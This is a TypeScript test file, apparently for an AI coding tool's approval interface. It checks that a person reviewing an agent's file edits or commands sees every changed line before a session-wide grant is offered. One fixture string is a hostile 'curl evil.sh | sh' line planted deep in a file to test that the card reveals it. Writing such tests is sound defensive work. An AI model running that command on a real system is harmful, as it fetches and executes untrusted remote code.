    const action = reduceToolReviewKey(state, '', { return: true }, true, undefined, false, 0);
    if (action.kind !== 'state') throw new Error('missing search state');
    return { state, found: action.state };
  };

  it('continues after a masked first hit to a visible later hit on the same line', () => {
    const value = 'sk-proj-testidabcdefghijklmnop testid';
    const { state, found } = search(value, 'testid');
    expect(state.document?.masks).not.toHaveLength(0);
    expect(found.cursor).toEqual({ line: 1, offset: value.lastIndexOf('testid') });
    expect(found.message).toBe('Match found');
    expect(found.previous).toEqual([state.cursor]);
    expect(found.reveal).toBe(false);
  });

  it('does not distinguish a hidden match from no match, while deliberate reveal can find it', () => {
    const value = 'sk-proj-testidabcdefghijklmnop';
    const hidden = search(value, 'testid');
    const absent = search(value, 'not-present');
    expect(hidden.found.cursor).toEqual(hidden.state.cursor);
    expect(hidden.found.previous).toEqual([]);
    expect(hidden.found.message).toBe('No later visible match');
    expect(absent.found.message).toBe(hidden.found.message);
    expect(search(value, 'testid', 0, true).found.cursor).toEqual({
      line: 1,
      offset: value.indexOf('testid'),
    });
  });

  it('keeps overlapping visible candidates after the blocking mask boundary', () => {
    const value = 'sk-proj-' + 'a'.repeat(25) + '.a.a';
    const { state, found } = search(value, 'a.a');
    const mask = state.document?.masks[0];
    if (mask === undefined) throw new Error('missing test mask');
    expect(value.indexOf('a.a')).toBeLessThan(mask.end);
    expect(value.lastIndexOf('a.a')).toBeLessThan(value.indexOf('a.a') + 3);
    expect(found.cursor).toEqual({ line: 1, offset: value.lastIndexOf('a.a') });
  });

  it('honors cursors inside a mask, after an earlier visible hit, and after all hits', () => {
    const value = 'sk-proj-testidabcdefghijklmnop testid testid';
    const firstVisible = value.indexOf(' testid') + 1;
    expect(search(value, 'testid', 10).found.cursor.offset).toBe(firstVisible);
    expect(search(value, 'testid', firstVisible + 1).found.cursor.offset).toBe(
      value.lastIndexOf('testid'),
    );
    const exhausted = search(value, 'testid', value.lastIndexOf('testid') + 1);
    expect(exhausted.found.message).toBe('No later visible match');
    expect(exhausted.found.cursor).toEqual(exhausted.state.cursor);
  });

  it('never matches across source-line boundaries or searches later source through an earlier line', () => {
    const lines = ['test', 'id', 'testid'];
    const after = lines.join('\n') + '\n';
    let position = 0;
    const document = createReviewDocument({
      kind: 'operation',
      fields: [],
      diff: {
        before: '',
        after,
        beforeEndings: 'empty',
        afterEndings: 'lf',
        stats: { addedLines: 3, removedLines: 0, beforeBytes: 0, afterBytes: reviewBytes(after) },
        lines: lines.map((text, index) => {
          const start = position;
          position += text.length + 1;
          return {
            kind: 'added',
            text,
            ending: 'lf',
            after: { line: index + 1, start, end: position },
          } satisfies ToolFileDiff['lines'][number];
        }),
      },
    });
    const state = {
      ...initialToolReview('details', 'lines', document),
      searching: true,
      query: 'test\nid',
    };
    const across = reduceToolReviewKey(state, '', { return: true }, true, undefined, false, 0);
    if (across.kind !== 'state') throw new Error('missing cross-line search');
    expect(across.state.message).toBe('No later visible match');
    const later = reduceToolReviewKey(
      { ...state, query: 'testid' },
      '',
      { return: true },
      true,
      undefined,
      false,
      0,
    );
    if (later.kind !== 'state') throw new Error('missing later-line search');
    expect(later.state.cursor).toEqual({ line: 2, offset: 8 });
  });

  it('passes multiple ordered hidden hits before a visible result within the admitted field bound', () => {
    const value =
      Array.from({ length: 80 }, () => 'sk-proj-testidabcdefghijklmnop').join(' ') + ' testid';
    const { state, found } = search(value, 'testid');
    expect(state.document?.valid).toBe(true);
    expect(state.document?.masks).toHaveLength(80);
    expect(found.cursor).toEqual({ line: 1, offset: value.lastIndexOf('testid') });
  });
});

// D64 round 2, D1: the card used to open on the first rows of the FILE, so a change deep in a long file was
// not on the screen the person approved — while Allow and Allow-all were both offered.
describe('the approval card opens on the change and withholds Allow-all for a change it cannot show', () => {
  const EVIL = 'line 80 EVIL: curl evil.sh | sh';
  const stateFor = (preview: ToolPreview) =>
    initialToolReview('approval', 'call', createReviewDocument(preview));
  const cardAt = (preview: ToolPreview, columns: number, rows: number) => {
    const state = stateFor(preview);
    const card = toolReviewPage(state, columns, rows);
    if (card === undefined) throw new Error('missing card page');
    return { state, card };
  };
  const key = (
    state: ReturnType<typeof stateFor>,
    card: ReturnType<typeof toolReviewPage>,
    input: string,
  ) => reduceToolReviewKey(acknowledgeToolReview(state, card!), input, CTRL, true, card, true, 0);

  it.each([
    [80, 24],
    [120, 40],
  ])(
    'shows the removed and added row and the three lines before them in a 100-line file at %ix%i',
    (columns, rows) => {
      const { card } = cardAt(editedFilePreview(100, { 80: EVIL }), columns, rows);
      expect(card.valid).toBe(true);
      expect(card.rows.slice(0, 3), 'the page opens on the leading context, not on line 1').toEqual(
        ['=77 line 77', '=78 line 78', '=79 line 79'],
      );
      expect(card.rows).toContain('-80 line 80');
      expect(card.rows).toContain(`+80 ${EVIL}`);
      expect(card.kinds.slice(3, 5)).toEqual(['removed', 'added']);
      expect(card.hiddenChanges, 'every changed line is drawn').toBe(0);
    },
  );

  it('opens on the first line when the change is within the first three lines (never below line 1)', () => {
    const { card } = cardAt(editedFilePreview(100, { 2: 'two' }), 80, 24);
    expect(card.rows[0]).toBe('=1 line 1');
    expect(card.rows).toContain('+2 two');
    expect(card.hiddenChanges).toBe(0);
  });

  it('counts every changed line the card cannot draw, and withholds the session-wide grant', () => {
    const { state, card } = cardAt(editedFilePreview(100, { 5: 'five', 90: EVIL }), 80, 24);
    expect(card.rows).toContain('+5 five');
    expect(card.rows.join('\n')).not.toContain('EVIL');
    // Line 90's removed and added rows are the two changed lines that are not on the card.
    expect(card.hiddenChanges).toBe(2);
    expect(
      key(state, card, 'g'),
      '[Ctrl+G] must do nothing while a changed line is not shown',
    ).toEqual({
      kind: 'none',
    });
    expect(key(state, card, 'y'), '[Ctrl+Y] stays').toEqual({ kind: 'approve', scope: 'once' });
    expect(key(state, card, 'n'), '[Ctrl+N] stays').toEqual({ kind: 'deny' });
  });

  it('makes room for the warning row: the body gives up a row, so the card still fits its budget', () => {
    const preview = editedFilePreview(100, { 5: 'five', 90: EVIL });
    const { state, card } = cardAt(preview, 80, 24);
    const spent =
      CARD_RULE_ROWS +
      1 + // the title row
      card.rows.length +
      1 + // the summary row
      cardWarnings({
        document: state.document,
        shortenedTarget: false,
        targetHiddenBytes: 0,
        inspected: true,
        changesNotShown: card.hiddenChanges,
        columns: 78,
      }).length +
      CARD_KEY_ROWS;
    expect(spent).toBe(cardRowBudget(24));
  });

  it('keeps [Ctrl+G] for a short change that fits whole', () => {
    const { state, card } = cardAt(editedFilePreview(8, { 4: 'four' }), 80, 24);
    expect(card.hiddenChanges).toBe(0);
    expect(key(state, card, 'g')).toEqual({ kind: 'approve', scope: 'always' });
  });

  it('withholds [Ctrl+G] for a large new file, whose every line is a change the card cannot hold', () => {
    const lines = 200;
    const text = Array.from({ length: lines }, (_, index) => `row ${index + 1}`);
    let offset = 0;
    const preview: ToolPreview = {
      kind: 'operation',
      target: 'big.txt',
      fields: [],
      diff: {
        before: null,
        after: `${text.join('\n')}\n`,
        beforeEndings: 'empty',
        afterEndings: 'lf',
        stats: {
          addedLines: lines,
          removedLines: 0,
          beforeBytes: 0,
          afterBytes: reviewBytes(`${text.join('\n')}\n`),
        },
        lines: text.map((row, index) => {
          const start = offset;
          offset += row.length + 1;
          return {
            kind: 'added' as const,
            text: row,
            ending: 'lf' as const,
            after: { line: index + 1, start, end: offset },
          };
        }),
      },
    };
    const { state, card } = cardAt(preview, 80, 24);
    expect(card.hiddenChanges).toBe(lines - card.rows.length);
    expect(card.hiddenChanges).toBeGreaterThan(0);
    expect(key(state, card, 'g')).toEqual({ kind: 'none' });
  });

  // PR #99 security sitting E2: this test used to pin the OPPOSITE ("the full view lists the whole change by paging, so
  // [a] stays") — but a page of the full view shows only its own rows, and the session-wide grant would cover a change
  // the person never saw. The full view now follows the same rule as the card (see the block below).
  it('withholds [Ctrl+G] in the full view while a changed line is missing from the page it draws', () => {
    const state = {
      ...stateFor(editedFilePreview(100, { 5: 'five', 90: EVIL })),
      screen: 'full' as const,
    };
    const page = toolReviewPage(state, 80, 24);
    expect(page?.hiddenChanges).toBeGreaterThan(0);
    expect(
      reduceToolReviewKey(acknowledgeToolReview(state, page!), 'g', CTRL, true, page, true, 0),
    ).toEqual({ kind: 'none' });
  });
});

// PR #99 security sitting E2: "a partial view earns no session-wide grant" held for the card's diff only. `Ctrl+G` — the key
// and the legend, on the card and in the full view — is offered only when the page being drawn shows everything the grant
// would cover: every changed line of a diff, every line of a preview that has none.
describe('[Ctrl+G] is offered only when the drawn page shows everything it would grant (E2)', () => {
  const stateFor = (
    preview: ToolPreview,
    patch: Partial<ReturnType<typeof initialToolReview>> = {},
  ) => ({
    ...initialToolReview('approval', 'call', createReviewDocument(preview)),
    ...patch,
  });
  const drawn = (state: ReturnType<typeof stateFor>, columns = 80, rows = 24) => {
    const page = toolReviewPage(state, columns, rows);
    if (page === undefined) throw new Error('missing page');
    return page;
  };
  const press = (
    state: ReturnType<typeof stateFor>,
    page: ReturnType<typeof drawn>,
    input: string,
  ) => reduceToolReviewKey(acknowledgeToolReview(state, page), input, CTRL, true, page, true, 0);
  const full = (preview: ToolPreview, cursor = { line: 0, offset: 0 }) =>
    stateFor(preview, { screen: 'full', cursor });
  /** A `run_command`-like preview: no diff, the argument vector is a field. */
  const command = (extra: number): ToolPreview => ({
    kind: 'operation',
    target: 'git',
    fields: [
      {
        name: 'args',
        value: JSON.stringify([
          'status',
          ...Array.from(
            { length: extra },
            (_, index) => `--pathspec-from-file=docs/file-${index}.txt`,
          ),
        ]),
      },
    ],
  });

  describe('a diff', () => {
    it('the full view first page of a 400-line file edited at lines 5 and 390 grants nothing session-wide', () => {
      const state = full(editedFilePreview(400, { 5: 'five', 390: 'EVIL 390' }));
      const page = drawn(state);
      expect(page.rows.join('\n'), 'the page shows only the top of the file').not.toContain('EVIL');
      expect(page.hiddenChanges).toBeGreaterThan(0);
      expect(reviewOffersAlways(state, page, true)).toBe(false);
      expect(press(state, page, 'g'), '[Ctrl+G] must leave the approval unresolved').toEqual({
        kind: 'none',
      });
      expect(press(state, page, 'y'), '[Ctrl+Y] stays').toEqual({ kind: 'approve', scope: 'once' });
      expect(press(state, page, 'n'), '[Ctrl+N] stays').toEqual({ kind: 'deny' });
    });

    it('a full-view page that is missing only the first of two changes still grants nothing', () => {
      const preview = editedFilePreview(60, { 5: 'five', 55: 'fifty-five' });
      const document = createReviewDocument(preview);
      const second = document.lines.findIndex((line) => line.label === '+55');
      const state = full(preview, { line: second - 1, offset: 0 });
      const page = drawn(state);
      expect(page.rows.join('\n')).toContain('+55 fifty-five');
      expect(page.hiddenChanges, 'the change before the page is not drawn').toBeGreaterThan(0);
      expect(press(state, page, 'g')).toEqual({ kind: 'none' });
    });

    it('a full-view page that shows every changed line grants it', () => {
      const state = full(editedFilePreview(8, { 4: 'four' }));
      const page = drawn(state);
      expect(page.hiddenChanges).toBe(0);
      expect(reviewOffersAlways(state, page, true)).toBe(true);
      expect(press(state, page, 'g')).toEqual({ kind: 'approve', scope: 'always' });
    });

    // PR #99 corrective sitting G2: a page that STARTS PARTWAY through a changed line did not count that line as hidden,
    // so the last page of one long changed line (a minified bundle, a one-line JSON) offered the session-wide grant
    // for a line whose beginning the person never saw on that page.
    describe('a changed line that spans several full-view pages (G2)', () => {
      const long = replacement(null, `${'x'.repeat(1500)}\n`);
      /** Every page of the full view, in order, each as the state the person is on when it is drawn. */
      const pages = () => {
        const result: { state: ReturnType<typeof full>; page: ReturnType<typeof drawn> }[] = [];
        let state = full(long);
        for (let guard = 0; guard < 50; guard++) {
          const page = drawn(state);
          result.push({ state, page });
          if (page.next === undefined) break;
          state = full(long, page.next);
        }
        return result;
      };

      it('counts the line as hidden on every page that does not start at its beginning', () => {
        const all = pages();
        expect(all.length, 'the line really does span several pages').toBeGreaterThan(2);
        const partway = all.filter(({ state }) => state.cursor.offset > 0);
        expect(partway.length, 'some page starts partway through the line').toBeGreaterThan(0);
        for (const { state, page } of partway) {
          expect(
            page.hiddenChanges,
            `page at ${JSON.stringify(state.cursor)} starts inside the changed line`,
          ).toBeGreaterThan(0);
          expect(reviewOffersAlways(state, page, true)).toBe(false);
          expect(press(state, page, 'g')).toEqual({ kind: 'none' });
          expect(press(state, page, 'y'), '[Ctrl+Y] stays').toEqual({
            kind: 'approve',
            scope: 'once',
          });
        }
      });

      it('the last page, which reaches the end of the line but not its start, grants nothing', () => {
        const last = pages().at(-1);
        expect(last?.page.next).toBeUndefined();
        expect(last?.state.cursor.offset).toBeGreaterThan(0);
        expect(last?.page.hiddenChanges).toBe(1);
        expect(reviewOffersAlways(last!.state, last!.page, true)).toBe(false);
      });

      it('counts the line once, not twice, for a page that starts and ends inside it', () => {
        const middle = pages().find(({ state, page }) => state.cursor.offset > 0 && page.next);
        expect(middle, 'a page strictly inside the line exists').toBeDefined();
        expect(middle?.page.hiddenChanges).toBe(1);
      });

      it('the first page, which starts at the beginning of the line, still cuts it and grants nothing', () => {
        const first = pages()[0]!;
        expect(first.state.cursor.offset).toBe(0);
        expect(first.page.next).toBeDefined();
        expect(first.page.hiddenChanges).toBe(1);
        expect(reviewOffersAlways(first.state, first.page, true)).toBe(false);
      });

      it('a page that starts at offset 0 of a changed line and shows all of it still offers [Ctrl+G]', () => {
        const short = replacement(null, 'one short line\n');
        const state = full(short);
        const page = drawn(state);
        expect(state.cursor.offset).toBe(0);
        expect(page.next).toBeUndefined();
        expect(page.hiddenChanges).toBe(0);
        expect(reviewOffersAlways(state, page, true)).toBe(true);
      });

      // PR #99 security sitting H4: a cursor's offset is an ABSOLUTE offset into its field (`projectReviewRow` starts at
      // `Math.max(line.start, page.offset)` and a search returns `line.start + relative`), so "starts partway through the
      // line" is `offset > line.start`, never `offset > 0`. Every cursor below therefore carries the line's own
      // absolute start: the old offset-0 and offset-3 cursors sat BELOW it and could not tell the two readings apart.
      describe('a cursor carries an absolute field offset (H4)', () => {
        /** One line inserted after line 30 of a 60-line file: its after-side start is far above 0. */
        const inserted = () => insertedLinePreview(60, 30, 'inserted here');
        const lineAt = (document: ReturnType<typeof createReviewDocument>, label: string) => {
          const index = document.lines.findIndex((line) => line.label === label);
          const line = document.lines[index];
          if (line === undefined) throw new Error(`no line ${label}`);
          return { index, line };
        };

        it('a page starting exactly at the start of the only changed line shows all of it and offers [Ctrl+G]', () => {
          const preview = inserted();
          const { index, line } = lineAt(createReviewDocument(preview), '+31');
          expect(line.start, 'the start is an absolute offset, not 0').toBeGreaterThan(100);
          const state = full(preview, { line: index, offset: line.start });
          const shown = drawn(state);
          expect(shown.rows.join('\n'), 'the page draws the whole change').toContain(
            '+31 inserted here',
          );
          expect(shown.hiddenChanges).toBe(0);
          expect(reviewOffersAlways(state, shown, true)).toBe(true);
          expect(press(state, shown, 'g')).toEqual({ kind: 'approve', scope: 'always' });
        });

        it('a page starting one byte into the changed line does not show its beginning: [Ctrl+G] is withheld', () => {
          const preview = inserted();
          const { index, line } = lineAt(createReviewDocument(preview), '+31');
          const state = full(preview, { line: index, offset: line.start + 1 });
          const shown = drawn(state);
          expect(shown.hiddenChanges, 'the line is counted as not drawn').toBe(1);
          expect(reviewOffersAlways(state, shown, true)).toBe(false);
          expect(press(state, shown, 'g')).toEqual({ kind: 'none' });
          expect(press(state, shown, 'y'), '[Ctrl+Y] stays').toEqual({
            kind: 'approve',
            scope: 'once',
          });
        });

        it('a cursor below the line start is the line start (the projection clamps it)', () => {
          const preview = inserted();
          const { index, line } = lineAt(createReviewDocument(preview), '+31');
          const state = full(preview, { line: index, offset: line.start - 1 });
          const shown = drawn(state);
          expect(shown.rows.join('\n')).toContain('+31 inserted here');
          expect(shown.hiddenChanges).toBe(0);
        });

        it('a search that lands at the start of the only changed line offers [Ctrl+G] (g2-insert.mts)', () => {
          const preview = inserted();
          const document = createReviewDocument(preview);
          let state = full(preview);
          const type = (input: string, key: Parameters<typeof reduceToolReviewKey>[2] = {}) => {
            const action = reduceToolReviewKey(state, input, key, true, drawn(state), true, 1);
            if (action.kind !== 'state') throw new Error(`${input} gave ${action.kind}`);
            state = { ...state, ...action.state };
          };
          type('/');
          for (const character of 'inserted') type(character);
          type('', { return: true });
          const { line } = lineAt(document, '+31');
          expect(
            state.cursor,
            'the search put the page on the line, at its absolute start',
          ).toEqual({
            line: document.lines.indexOf(line),
            offset: line.start,
          });
          const shown = drawn(state);
          expect(shown.rows.join('\n')).toContain('+31 inserted here');
          expect(shown.hiddenChanges).toBe(0);
          expect(reviewOffersAlways(state, shown, true)).toBe(true);
        });

        it('a search that lands inside the changed line withholds [Ctrl+G]', () => {
          const preview = inserted();
          const document = createReviewDocument(preview);
          let state = full(preview);
          const type = (input: string, key: Parameters<typeof reduceToolReviewKey>[2] = {}) => {
            const action = reduceToolReviewKey(state, input, key, true, drawn(state), true, 1);
            if (action.kind !== 'state') throw new Error(`${input} gave ${action.kind}`);
            state = { ...state, ...action.state };
          };
          type('/');
          for (const character of 'here') type(character);
          type('', { return: true });
          const { line } = lineAt(document, '+31');
          expect(state.cursor.offset, 'the match is partway through the line').toBe(line.start + 9);
          expect(reviewOffersAlways(state, drawn(state), true)).toBe(false);
        });

        it('does not count an unchanged line the page starts partway through', () => {
          // A long CONTEXT line is not part of what the grant covers: starting inside it hides no change of its own.
          const preview = editedFilePreview(40, { 30: 'thirty' });
          const document = createReviewDocument(preview);
          const { index, line } = lineAt(document, '=10');
          expect(index).toBeGreaterThan(0);
          expect(line.start, 'an absolute offset well above 3').toBeGreaterThan(50);
          const atStart = drawn(full(preview, { line: index, offset: line.start }));
          const partway = drawn(full(preview, { line: index, offset: line.start + 3 }));
          expect(partway.hiddenChanges).toBe(atStart.hiddenChanges);
        });
      });
    });

    it('a 100-line single change still offers [Ctrl+G] on the card and on the full view', () => {
      const preview = editedFilePreview(100, { 50: 'fifty' });
      const card = stateFor(preview);
      const cardPage = drawn(card);
      expect(cardPage.rows).toContain('+50 fifty');
      expect(cardPage.hiddenChanges).toBe(0);
      expect(reviewOffersAlways(card, cardPage, true), 'on the card').toBe(true);
      expect(press(card, cardPage, 'g')).toEqual({ kind: 'approve', scope: 'always' });
      // The full view opens at the top; the person pages to the change, and then the page shows all of it.
      const document = createReviewDocument(preview);
      const change = document.lines.findIndex((line) => line.label === '-50');
      const atTop = full(preview);
      expect(
        reviewOffersAlways(atTop, drawn(atTop), true),
        'the first page does not show the change',
      ).toBe(false);
      const paged = full(preview, { line: change - 1, offset: 0 });
      const pagedPage = drawn(paged);
      expect(pagedPage.rows).toContain('+50 fifty');
      expect(reviewOffersAlways(paged, pagedPage, true), 'on the full view').toBe(true);
      expect(press(paged, pagedPage, 'g')).toEqual({ kind: 'approve', scope: 'always' });
    });

    it('never offers [Ctrl+G] to a call that may not be remembered, whatever the page shows', () => {
      const state = full(editedFilePreview(8, { 4: 'four' }));
      expect(reviewOffersAlways(state, drawn(state), false)).toBe(false);
    });

    it('offers nothing before a page has been drawn (fail closed)', () => {
      expect(
        reviewOffersAlways(stateFor(editedFilePreview(8, { 4: 'four' })), undefined, true),
      ).toBe(false);
    });
  });

  describe('a preview without a diff', () => {
    it('a clipped run_command card grants nothing session-wide, though its hidden tail is what executes', () => {
      const state = stateFor(command(30));
      const page = drawn(state);
      expect(page.next, 'the argument vector is cut').toBeDefined();
      expect(page.hiddenLines).toBeGreaterThan(0);
      expect(page.hiddenChanges, 'there is no diff, so the old count is blind to it').toBe(0);
      expect(reviewOffersAlways(state, page, true)).toBe(false);
      expect(press(state, page, 'g')).toEqual({ kind: 'none' });
      expect(press(state, page, 'y'), '[Ctrl+Y] stays').toEqual({ kind: 'approve', scope: 'once' });
    });

    it('an unclipped one offers it', () => {
      const state = stateFor(command(2));
      const page = drawn(state);
      expect(page.next).toBeUndefined();
      expect(reviewOffersAlways(state, page, true)).toBe(true);
      expect(press(state, page, 'g')).toEqual({ kind: 'approve', scope: 'always' });
    });

    it('the full view offers it only while the page starts at the top and reaches the end', () => {
      const small = full(command(2));
      expect(reviewOffersAlways(small, drawn(small), true), 'whole preview on one page').toBe(true);
      const clipped = full(command(30));
      const first = drawn(clipped);
      expect(first.next, 'the first page is cut').toBeDefined();
      expect(reviewOffersAlways(clipped, first, true)).toBe(false);
      // Page forward to the last page: it reaches the end of the content, but the rows above it are not drawn.
      let last = clipped;
      let lastPage = first;
      for (let guard = 0; lastPage.next !== undefined && guard < 20; guard++) {
        last = full(command(30), lastPage.next);
        lastPage = drawn(last);
      }
      expect(lastPage.next, 'the last page reaches the end').toBeUndefined();
      expect(last.cursor, 'and it is not the top').not.toEqual({ line: 0, offset: 0 });
      expect(reviewOffersAlways(last, lastPage, true), 'content above the page is not shown').toBe(
        false,
      );
    });
  });
});

// D64 round 2, D2: the lock must not wait for an acknowledged frame — the first frame (and the first frame after a
// resize that shortens the target) is drawn before the state has recorded anything.
describe('a shortened target locks Allow from the first frame (D2)', () => {
  const unacknowledged = () =>
    initialToolReview(
      'approval',
      'first-frame',
      createReviewDocument({ kind: 'operation', target: 'd'.repeat(200), fields: [] }),
    );

  it('reads the lock from the page it is drawing, before any frame has been acknowledged', () => {
    const state = unacknowledged();
    const page = toolReviewPage(state, 80, 24);
    expect(state.requiredTarget, 'nothing has been acknowledged yet').toBeUndefined();
    expect(page?.requiredTarget).toEqual({ field: 0, start: 0, end: 200 });
    expect(reviewInspected(state, page?.requiredTarget)).toBe(false);
    expect(reduceToolReviewKey(state, 'y', CTRL, true, page, true, 0)).toEqual({ kind: 'none' });
    expect(reduceToolReviewKey(state, 'g', CTRL, true, page, true, 0)).toEqual({ kind: 'none' });
    expect(reduceToolReviewKey(state, 'n', CTRL, true, page, true, 0)).toEqual({ kind: 'deny' });
  });

  it('offers Allow once the whole target has been acknowledged in a frame that showed it', () => {
    const state = unacknowledged();
    const full = { ...state, screen: 'full' as const };
    const page = toolReviewPage(full, 80, 24);
    if (page === undefined) throw new Error('missing page');
    const inspected = acknowledgeToolReview(full, page);
    expect(reviewInspected(inspected, page.requiredTarget)).toBe(true);
    expect(reduceToolReviewKey(inspected, 'y', CTRL, true, page, true, 0)).toEqual({
      kind: 'approve',
      scope: 'once',
    });
  });
});

// PR #99 security sitting H1/H3: Enter confirms the session-wide grant only where nothing else owns it, and text typed into a
// text field is typing. The store decides the rest (the question must be open, the key on time); these are the state predicates.
describe('Enter as the confirmation and text entry as typing (H1, H3)', () => {
  const approval = (patch: Partial<ReturnType<typeof initialToolReview>> = {}) => ({
    ...initialToolReview(
      'approval',
      'call',
      createReviewDocument(editedFilePreview(8, { 4: 'four' })),
    ),
    ...patch,
  });
  const ENTER = { return: true } as const;

  it('is Enter on the card and on the full view of an approval, and only Enter', () => {
    expect(isAlwaysConfirmKey(approval(), ENTER)).toBe(true);
    expect(isAlwaysConfirmKey(approval({ screen: 'full' }), ENTER)).toBe(true);
    for (const key of [
      {},
      { escape: true },
      { tab: true },
      { downArrow: true },
      { backspace: true },
    ])
      expect(isAlwaysConfirmKey(approval(), key), JSON.stringify(key)).toBe(false);
  });

  it('is not Enter where a text field or a list owns it: the reason box denies, the search submits, the list selects', () => {
    expect(isAlwaysConfirmKey(approval({ denial: '' }), ENTER), 'reason box').toBe(false);
    expect(isAlwaysConfirmKey(approval({ denial: 'because' }), ENTER), 'reason box with text').toBe(
      false,
    );
    expect(
      isAlwaysConfirmKey(approval({ screen: 'full', searching: true, query: '' }), ENTER),
    ).toBe(false);
    expect(isAlwaysConfirmKey(approval({ screen: 'list' }), ENTER), 'list').toBe(false);
    expect(isAlwaysConfirmKey({ ...approval(), kind: 'details' }, ENTER), 'details').toBe(false);
  });

  it('is not a modified Enter', () => {
    expect(isAlwaysConfirmKey(approval(), { return: true, ctrl: true })).toBe(false);
    expect(isAlwaysConfirmKey(approval(), { return: true, meta: true })).toBe(false);
  });

  it('the reducer still gives Enter its text-field meaning: it denies in the reason box and submits a search', () => {
    const state = approval({ denial: 'no thanks' });
    expect(reduceToolReviewKey(state, '', ENTER, true, undefined, true, 0)).toEqual({
      kind: 'deny',
      reason: 'no thanks',
    });
    const searching = approval({ screen: 'full', searching: true, query: 'four' });
    const action = reduceToolReviewKey(searching, '', ENTER, true, undefined, true, 0);
    expect(action.kind).toBe('state');
    expect(action.kind === 'state' && action.state.searching).toBe(false);
  });

  it('typing is the reason box and the search query, nothing else', () => {
    expect(isTypingIntoReview(approval({ denial: '' }))).toBe(true);
    expect(isTypingIntoReview(approval({ screen: 'full', searching: true, query: '' }))).toBe(true);
    expect(isTypingIntoReview(approval())).toBe(false);
    expect(isTypingIntoReview(approval({ screen: 'full' }))).toBe(false);
  });
});

// PR #99: every key that ANSWERS an approval card is a Ctrl chord. While a turn runs the person is often typing the next
// instruction, and a bare letter typed at a card that has just appeared is indistinguishable from a deliberate answer —
// "yes do it" would approve a write with its `y`. The chord is what makes a key an answer; a bare letter is typing.
describe('reviewAnswerKey — the answer keys are Ctrl chords, never a bare letter', () => {
  const PRINTABLE = Array.from({ length: 0x7f - 0x20 }, (_, index) =>
    String.fromCharCode(0x20 + index),
  );

  it('maps Ctrl+Y to allow, Ctrl+G to always, Ctrl+N to deny and Ctrl+R to reason', () => {
    expect(reviewAnswerKey('y', CTRL)).toBe('allow');
    expect(reviewAnswerKey('g', CTRL)).toBe('always');
    expect(reviewAnswerKey('n', CTRL)).toBe('deny');
    expect(reviewAnswerKey('r', CTRL)).toBe('reason');
  });

  it('answers nothing for a bare printable character — not y, g, n, r, a, c, a digit or an upper-case letter', () => {
    for (const input of PRINTABLE)
      expect(reviewAnswerKey(input, {}), JSON.stringify(input)).toBeUndefined();
    // The old single-letter answers and the old digit shortcuts, named, so a regression reads as what it is.
    for (const input of ['y', 'a', 'n', 'c', 'r', 'g', '1', '2', '3', 'Y', 'A', 'N'])
      expect(reviewAnswerKey(input, {}), input).toBeUndefined();
  });

  it('answers nothing for a Ctrl+Alt (meta) chord, nor for Alt alone', () => {
    for (const input of ['y', 'g', 'n', 'r']) {
      expect(
        reviewAnswerKey(input, { ctrl: true, meta: true }),
        `ctrl+meta ${input}`,
      ).toBeUndefined();
      expect(reviewAnswerKey(input, { meta: true }), `meta ${input}`).toBeUndefined();
    }
  });

  it('answers nothing for any other Ctrl letter or character (Ctrl+A/E/S/T/W/Z and the rest)', () => {
    for (const input of PRINTABLE) {
      if ('ygnr'.includes(input)) continue;
      expect(reviewAnswerKey(input, CTRL), `ctrl+${JSON.stringify(input)}`).toBeUndefined();
    }
    for (const input of ['a', 'e', 's', 't', 'w', 'z', 'c'])
      expect(reviewAnswerKey(input, CTRL), `ctrl+${input}`).toBeUndefined();
    // Only the exact one-letter chord Ink derives from the control byte: nothing empty, coalesced or upper-case.
    for (const input of ['', 'yy', 'ny', 'Y', 'N', 'G', 'R'])
      expect(reviewAnswerKey(input, CTRL), JSON.stringify(input)).toBeUndefined();
  });
});

describe('reduceToolReviewKey — an approval is answered by a Ctrl chord only', () => {
  const small = () => editedFilePreview(8, { 4: 'four' });
  /** An approval card whose frame has been acknowledged: Allow is unlocked and the whole change is on the page. */
  const answerable = (
    preview: ToolPreview = small(),
    patch: Partial<ReturnType<typeof initialToolReview>> = {},
  ) => {
    const base = {
      ...initialToolReview('approval', 'call', createReviewDocument(preview)),
      ...patch,
    };
    const drawn = toolReviewPage(base, 80, 24);
    // The call list draws no page at all; every other screen does.
    if (drawn === undefined && base.screen !== 'list') throw new Error('missing page');
    return { state: drawn === undefined ? base : acknowledgeToolReview(base, drawn), page: drawn };
  };
  const press = (
    { state, page }: ReturnType<typeof answerable>,
    input: string,
    key: Parameters<typeof reduceToolReviewKey>[2],
    { visible = true, cacheable = true } = {},
  ) => reduceToolReviewKey(state, input, key, visible, page, cacheable, 0);

  it('Ctrl+Y approves once on a visible, inspected card', () => {
    expect(press(answerable(), 'y', CTRL)).toEqual({ kind: 'approve', scope: 'once' });
  });

  it('Ctrl+Y needs the visible frame and an unlocked Allow', () => {
    expect(press(answerable(), 'y', CTRL, { visible: false })).toEqual({ kind: 'none' });
    // A target the card shortens locks Allow until the whole target has been inspected in the full view.
    const locked = answerable({ kind: 'operation', target: 'd'.repeat(200), fields: [] });
    expect(press(locked, 'y', CTRL)).toEqual({ kind: 'none' });
  });

  it('Ctrl+G approves always — and only when the card offers it (cacheable, and the page shows everything it grants)', () => {
    const whole = answerable();
    expect(reviewOffersAlways(whole.state, whole.page, true)).toBe(true);
    expect(press(whole, 'g', CTRL)).toEqual({ kind: 'approve', scope: 'always' });
    // Not cacheable: the call may not be remembered, so the chord answers nothing — while Ctrl+Y still allows it once.
    expect(press(whole, 'g', CTRL, { cacheable: false })).toEqual({ kind: 'none' });
    expect(press(whole, 'y', CTRL, { cacheable: false })).toEqual({
      kind: 'approve',
      scope: 'once',
    });
    // A change the card cannot draw: the session-wide grant would cover lines the person never saw.
    const partial = answerable(editedFilePreview(100, { 5: 'five', 90: 'EVIL' }));
    expect(partial.page?.hiddenChanges).toBeGreaterThan(0);
    expect(reviewOffersAlways(partial.state, partial.page, true)).toBe(false);
    expect(press(partial, 'g', CTRL)).toEqual({ kind: 'none' });
    expect(press(partial, 'y', CTRL)).toEqual({ kind: 'approve', scope: 'once' });
    // And not on a frame that is not visible.
    expect(press(whole, 'g', CTRL, { visible: false })).toEqual({ kind: 'none' });
  });

  it('Ctrl+N denies — even when the frame is not visible and the review is not inspected', () => {
    expect(press(answerable(), 'n', CTRL)).toEqual({ kind: 'deny' });
    expect(press(answerable(), 'n', CTRL, { visible: false })).toEqual({ kind: 'deny' });
    const unreadable = {
      state: initialToolReview('approval', 'call', createReviewDocument(small())),
      page: undefined,
    };
    expect(press(unreadable, 'n', CTRL, { visible: false })).toEqual({ kind: 'deny' });
  });

  it('Ctrl+R opens the reason box on the card screen — and does nothing on the full screen', () => {
